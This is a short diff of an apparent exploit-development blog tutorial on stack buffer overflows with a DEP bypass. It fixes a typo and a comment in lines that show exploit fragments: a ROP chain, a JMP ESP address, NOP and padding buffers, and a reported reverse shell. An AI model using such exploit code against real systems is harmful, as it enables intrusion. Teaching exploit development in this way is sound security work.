@@ -547,7 +547,7 @@ def create_rop_chain():
 rop_chain = create_rop_chain()
 
 
-#JMP ESP 0x625011AF: \xAF\x11\x50\x62 (not required anymore)
+#JMP ESP 0x625011AF: \xAF\x11\x50\x62 (not required anymore, but you can use it if you want)
 memn0ps = "\x90"
 
 payload = "A" * 2003
@@ -572,7 +572,7 @@ except:
 
 
 
-!W00TW00T we have a reverse shell. DEP was succesfully bypassed
+W00TW00T we have a reverse shell. DEP was successfully bypassed
 
 ![WOOTWOOT.png](/images/2020-10-12-Stack-Based-Buffer-Overflows-DEP-Part-4/e344346141f940aa99c9fb4dec5ad6c8.png)
 
